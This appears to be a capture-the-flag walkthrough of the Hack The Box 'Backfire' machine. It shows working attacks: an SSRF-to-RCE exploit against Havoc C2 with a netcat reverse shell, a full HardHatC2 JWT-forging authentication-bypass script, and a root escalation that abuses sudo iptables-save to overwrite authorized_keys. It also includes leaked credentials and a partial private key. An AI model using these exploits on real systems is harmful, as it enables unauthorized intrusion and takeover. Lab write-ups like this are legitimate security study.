@@ -1,0 +1,312 @@
+---
+title: backfire
+date: '2025-01-20'
+description: The Backfire Machine on Hack The Box is a Medium level .
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - hackmyvm
+  - HTB
+  - MEDIUM
+cover: /mc/uploads/2025/01/backfired-free-font-01.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+In this walkthrough, we'll explore the steps to compromise the backfire machine  
+on Hack The Box. We'll cover enumeration, vulnerability discovery, exploitation, and privilege escalation. Let's dive in!
+
+## enumeration nmap
+
+```bash
+$ nmap -sV 10.10.11.49 -T5
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 19:19 +01
+Nmap scan report for backfire.htb (10.10.11.49)
+Host is up (0.058s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE    SERVICE  VERSION
+22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
+443/tcp  open     ssl/http nginx 1.22.1
+5000/tcp filtered upnp
+8000/tcp open     http     nginx 1.22.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
+```
+- Port 22 (SSH): OpenSSH is running, which could be a potential entry point  
+    if we find valid credentials.
+- Port 443 (HTTPS): Nginx is serving a web application over HTTPS.
+- Port 5000 (UPnP): Filtered, meaning it's likely blocked by a firewall.
+- Port 8000 (HTTP): Nginx is serving another web application over HTTP.
+
+## Exploring Port 8000
+
+We navigate to  and find two files:
+
+- havoc.yaotl
+- disable\_tls.patch
+
+The havoc.yaotl file contains interesting information, including credentials and configuration details for a Havoc C2 framework.
+
+Contents of **havoc.yaotl**:
+
+```bash
+
+Demon {
+    Sleep = 2
+    Jitter = 15
+
+    TrustXForwardedFor = false
+
+    Injection {
+        Spawn64 = "C:\Windows\System32\notepad.exe"
+        Spawn32 = "C:\Windows\SysWOW64\notepad.exe"
+    }
+
+Operators {
+    user "ilya" {
+        Password = "CobaltStr1keSuckz!"
+    }
+
+    user "sergej" {
+        Password = "1w4nt2sw1tch2h4rdh4tc2"
+    }
+}
+```
+Key Findings:
+
+- Credentials for two users: ilya and sergej.
+- The configuration suggests the presence of a Havoc C2 framework.
+
+## foothold
+
+After some research, we discover that the Havoc C2 framework is vulnerable to SSRF (Server-Side Request Forgery) and RCE (Remote Code Execution).  
+The following resources provide more details:
+
+- [**Havoc C2 Vulnerabilities RCE**](https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce)
+- [**Havoc C2 SSRF PoC**](https://github.com/chebuya/Havoc-C2-SSRF-poc/blob/main/exploit.py)
+
+We also find a script that combines both vulnerabilities to achieve SSRF to RCE:
+
+- [**SSRF to RCE Script**](https://gist.github.com/pich4ya/bda16a3b2104bea411612f20d536174b)
+
+We create a Python virtual environment to ensure all dependencies are met.
+
+```bash
+python3 -m venv venv
+source venv/bin/activate
+```
+We start a netcat listener on port 443 to catch the reverse shell.
+
+```bash
+nc -vlnp 443
+```
+We use the ssrf2rce.py script to exploit the vulnerability.
+
+```bash
+$ python3 ssrf2rce.py -t https://10.10.11.49:443 -l 10.10.14.225 --c2user ilya --c2pass 'CobaltStr1keSuckz!' 
+[***] Trying to register agent...
+[***] Success!
+[***] Trying to open socket on the teamserver...
+[***] Success!
+[***] Trying to write to the socket
+[***] Success!
+[***] Trying to write to the socket
+[***] Success!
+23983
+[***] Trying to write to the socket
+[***] Success!
+[***] Trying to write to the socket
+[***] Success!
+[***] Trying to poll teamserver for socket output...
+[***] Read socket output successfully!
+```
+Back on our listener, we receive a reverse shell as the user ilya.
+
+```bash
+nc -vlnp 443 
+$ listening on [any] 443 ...
+connect to [10.10.14.225] from (UNKNOWN) [10.10.11.49] 37496
+bash: cannot set terminal process group (898): Inappropriate ioctl for device
+bash: no job control in this shell
+ilya@backfire:~/Havoc/payloads/Demon$ whoami 
+ilya
+```
+## Privilege Escalation
+
+We use the linpeas.sh tool to enumerate the system for potential privilege escalation vectors.
+
+Finding:
+
+- The SSH private key for the user ilya is discovered.
+
+```bash
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAyKwoxqjIPVtCeHWG7zs1N+sOIg3bUa0PN4LMw664TnQKEvUqNorU
+8BsOjPIXMfhjWkvII9S7xq+7WQQRUjbXceFbv3QwZhmFb/bT9AYxqCVpJ/Uvr7uE0u24NW
+eCSq47k2y6iEysUz1M3O/VfW6p5Fmc0GD8OBIoD5KHsVyz4QYogJybOyoFO3nFzByIhB1z
+MaJrBTGd13R5n6E747xUeXETeusDeruHvC+U/B9+sYsr0/xugnDFpuIzLvvoCRwjXyTztj
+xVQrrRp2KGnYBh9wHbFQ8IxATXeUTSlGaPIgEw4s1kaKY/vC1oaZ7AiDEkhrWV4g2GB0XG
+Rwq2ADr6EeAswe/tAuiht6tamBHXACVWyJlOttVqbW627iTwCn9XXltgGuSFNhnlB7B3CO
+0Y7Xhrzb3uzpvumNJ0JTjPNUD6ssXEPnb4JUyYpeE8s+BM3NRQSp6gNl93fpl27hutKW2Q
+NdQK9FPsQBK0eu9Oy6P6upJxul81N0q8O9kFqSo5AAAFiNBKac3QSmnNAAAAB3NzaC1yc2
+EAAAGBAMisKMaoyD1bQnh1hu87NTfrDiIN21GtDzeCzMOuuE50ChL1KjaK1PAbDozyFzH4
+Y1pLyCPUu8avu1kEEVI213HhW790MGYZhW/20/QGMaglaSf1L6+7hNLtuDVngkquO5Nsuo
+hMrFM9TNzv1X1uqeRZnNBg/DgSKA+Sh7Fcs+EGKICcmzsqBTt5xcwciIQdczGiawUxndd0
+eZ+hO+O8VHlxE3rrA3q7h7wvlPwffrGLK9P8boJwxabiMy776AkcI18k87Y8VUK60adihp
+2AYfcB2xUPCMQE13lE0pRmjyIBMOLNZGimP7wtaGmewIgxJIa1leINhgdFxkcKtgA6+hHg
+LMHv7QLooberWpgR1wAlVsiZTrbVam1utu4k8Ap/V15bYBrkhTYZ5QewdwjtGO14a8297s
+6b7pjSdCU4zzVA+rLFxD52+CVMmKXhPLPgTNzUUEqeoDZfd36Zdu4brSltkDXUCvRT7EAS
+tHrvTsuj+rqScbpfNTdKvDvZBakqOQAAAAMBAAEAAAGAAmLsvbcQYY1qKBNSulnYh0yV75
+D9XpZpp8n4DCwx4Cn4XDMa8EjcoSnbNZEj9jnLWa2syMNNA97/Yf6+w3zoOUAaNpfHwxES
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXX
+-----END OPENSSH PRIVATE KEY XXXXXXXXXXXXXXXXXXX
+```
+We forward ports to access services running locally on the target machine.
+
+```bash
+ssh -i id_rsa ilya@10.10.11.49 -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000
+```
+We find a note indicating that HardHatC2 is installed on the machine.
+
+```bash
+ilya@backfire:~$ cat hardhat.txt
+Sergej said he installed HardHatC2 for testing and  not made any changes to the defaults
+I hope he prefers Havoc bcoz I don't wanna learn another C2 framework, also Go > C#
+```
+After researching, we discover that HardHatC2 has an authentication bypass  
+vulnerability. We use the following script to exploit it:  
+
+```bash
+# @author Siam Thanat Hack Co., Ltd. (STH)
+import jwt
+import datetime
+import uuid
+import requests
+
+rhost = 'hardhatc2.local:5000'
+
+# Craft Admin JWT
+secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
+issuer = "hardhatc2.com"
+now = datetime.datetime.utcnow()
+
+expiration = now + datetime.timedelta(days=28)
+payload = {
+    "sub": "HardHat_Admin",  
+    "jti": str(uuid.uuid4()),
+    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
+    "iss": issuer,
+    "aud": issuer,
+    "iat": int(now.timestamp()),
+    "exp": int(expiration.timestamp()),
+    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
+}
+
+token = jwt.encode(payload, secret, algorithm="HS256")
+print("Generated JWT:")
+print(token)
+
+# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
+burp0_url = f"https://{rhost}/Login/Register"
+burp0_headers = {
+  "Authorization": f"Bearer {token}",
+  "Content-Type": "application/json"
+}
+burp0_json = {
+  "password": "nutzh", # you can choose what u want 
+  "role": "TeamLead",
+  "username": "nutzh"  # you can choose what u want
+}
+r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
+print(r.text)
+```
+run the script
+
+```bash
+$ python3 HardHat.py 
+
+User nutzh created #output
+```
+We authenticate with the newly created user and gain access to the HardHatC2 framework. From there, we interact with the terminal and discover that the user sergej can run iptables and iptables-save as root.
+
+```bash
+nc -vlnp 4445                                                               
+listening on [any] 4445 ...
+connect to [10.10.14.225] from (UNKNOWN) [10.10.11.49] 57182
+bash: cannot set terminal process group (1842): Inappropriate ioctl for device
+bash: no job control in this shell
+sergej@backfire:~/HardHatC2/HardHatC2Client$ sudo -l
+sudo -l
+Matching Defaults entries for sergej on backfire:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
+    use_pty
+
+User sergej may run the following commands on backfire:
+    (root) NOPASSWD: /usr/sbin/iptables
+    (root) NOPASSWD: /usr/sbin/iptables-save
+sergej@backfire:~/HardHatC2/HardHatC2Client$
+```
+so googling a little about this command and we got this  
+
+We use the iptables command to modify the /root/.ssh/authorized\_keys file and  
+add our SSH public key.
+
+Generate an SSH Key:
+
+```bash
+$ ssh-keygen -t ecdsa -b 256 -f nutzhroot 
+
+$ cat nutzhroot.pub                        
+ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9qQpaXgZeN1WigWRfrcZhTd+/YU9r8KpHKopriKJ4olZf8TrsK+6nUb9+QG/6jPwOaYfd815ZQXb9l2gpEjwc= kali@kali
+```
+Add the Public Key to iptables:
+
+```bash
+sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n$SSHkey.pub generated\n'
+```
+Save the Configuration to /root/.ssh/authorized\_keys:
+
+```bash
+sudo iptables -S
+
+sudo iptables-save -f /root/.ssh/authorized_keys
+```
+SSH as Root with the generated key
+
+```bash
+$ ssh -i nutzhroot root@backfire.htb
+Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Mon Jan 20 13:59:29 2025 from 10.10.14.225
+root@backfire:~#
+```
+```text
+We successfully gain root access to the machine.
+```
+
+**GG!**🎉
+
+```text
+
+key takeaways:
+Enumeration is Key: Thoroughly enumerate all open ports and services to identify
+potential attack vectors.
+Research is Crucial: Always research the software and frameworks running on the
+target for known vulnerabilities.
+Leverage Misconfigurations: Misconfigurations, such as improper use of iptables,
+can lead to privilege escalation.
+Automate Where Possible: Use scripts and tools to automate exploitation and save time.
+```
